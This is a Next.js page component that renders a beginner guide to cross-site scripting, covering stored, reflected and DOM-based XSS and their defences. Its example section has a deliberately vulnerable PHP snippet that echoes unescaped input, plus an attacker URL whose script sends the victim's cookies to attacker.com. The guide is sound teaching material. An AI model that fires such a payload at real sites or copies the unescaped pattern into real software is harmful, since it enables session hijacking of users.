import type { Metadata } from 'next';
import GuideLayout from '@/components/GuideLayout';
import ContentEcosystemNav from '@/components/ContentEcosystemNav';

export const metadata: Metadata = {
  title: 'Cross-Site Scripting (XSS) – Complete Guide',
  description: 'Understand how Stored, Reflected, and DOM-based XSS work, the mechanics of injection, and how to implement robust defensive architecture.',
  alternates: { canonical: '/guides/web-security/xss' },
};

export default function XSSGuide() {
  return (
    <>
      <GuideLayout
        title="Cross-Site Scripting (XSS) – Complete Guide"
        description="Understand how Stored, Reflected, and DOM-based XSS work, the mechanics of injection, and how to implement robust defensive architecture."
        timeToRead="15 min"
        lastUpdated="October 2026"
        author="Zentrion Security Engineering"
        tags={['Web Security', 'Vulnerabilities', 'XSS']}
        difficulty="Beginner"
      >
        <div className="prose dark:prose-invert max-w-none prose-headings:text-[rgb(var(--c-ink))] text-[rgb(var(--c-ink))]">
          <h2>What is it?</h2>
          <p>
            Cross-Site Scripting (XSS) is a widespread vulnerability that occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows an attacker to execute malicious scripts (usually JavaScript) in the victim's browser.
          </p>

          <h2>Why does it matter?</h2>
          <p>
            When an attacker can execute arbitrary script in a user's browser, they gain the ability to completely bypass the Same Origin Policy. This means they can:
          </p>
          <ul>
            <li>Steal session cookies and hijack user accounts.</li>
            <li>Perform actions on behalf of the user (e.g., transferring funds, changing passwords).</li>
            <li>Capture keystrokes or inject fake login forms (keylogging / phishing).</li>
            <li>Redirect the user to malicious websites.</li>
          </ul>

          <h2>How it works (The Three Types)</h2>
          
          <h3>1. Stored XSS (Persistent)</h3>
          <p>
            The malicious payload is permanently stored on the target server (e.g., in a database, comment field, or message board). When a victim navigates to the affected page, the server serves the malicious payload along with the legitimate content.
          </p>

          <h3>2. Reflected XSS (Non-Persistent)</h3>
          <p>
            The injected payload is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. It requires the victim to click a crafted link.
          </p>

          <h3>3. DOM-based XSS</h3>
          <p>
            The vulnerability exists in client-side code rather than server-side code. The payload is executed as a result of modifying the DOM environment in the victim's browser, meaning the malicious payload may never actually reach the backend server.
          </p>

          <h2>Example</h2>
          <pre><code>{`// Vulnerable PHP Code Example (Reflected XSS)
<?php
  $name = $_GET['name'];
  echo "<h1>Welcome, " . $name . "!</h1>";
?>

// Attacker URL:
https://example.com/welcome.php?name=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`}</code></pre>

          <h2>Defensive Guidance & Prevention</h2>
          <p>
            Preventing XSS requires a defense-in-depth approach. No single control is sufficient for a complex application.
          </p>
          <ol>
            <li>
              <strong>Context-Aware Output Encoding:</strong> Never trust user input. Before rendering data into the DOM or HTML, encode it according to its context (HTML body, JavaScript variable, CSS, or URL). Frameworks like React and Angular do this automatically for standard variables, but you must still be careful with APIs like <code>dangerouslySetInnerHTML</code>.
            </li>
            <li>
              <strong>Content Security Policy (CSP):</strong> Implement a strict CSP to restrict where scripts can be loaded from and prevent the execution of inline scripts. 
            </li>
            <li>
              <strong>Input Validation:</strong> Validate all input against a strict allowlist of expected characters, types, and lengths. Reject anything that doesn't match.
            </li>
            <li>
              <strong>Secure Cookies:</strong> Always use the <code>HttpOnly</code> flag on session cookies so they cannot be accessed via <code>document.cookie</code> in JavaScript, mitigating the impact of an XSS compromise.
            </li>
          </ol>
        </div>

        <ContentEcosystemNav
          relatedGuides={[
            { label: 'CORS & CSP Explained', href: '/guides/web-security/cors' },
            { label: 'Cookies & Sessions', href: '/guides/web-security/cookies' }
          ]}
          relatedLabs={[
            { label: 'Stored XSS Live Environment', href: '/labs/xss' }
          ]}
          cheatsheet={{ label: 'Web Vulnerabilities', href: '/checklists/web-security' }}
          roadmap={{ label: 'Web Security', href: '/roadmaps/web-security' }}
          service={{ label: 'Web Application VAPT', href: '/services/vapt' }}
        />
      </GuideLayout>
    </>
  );
}
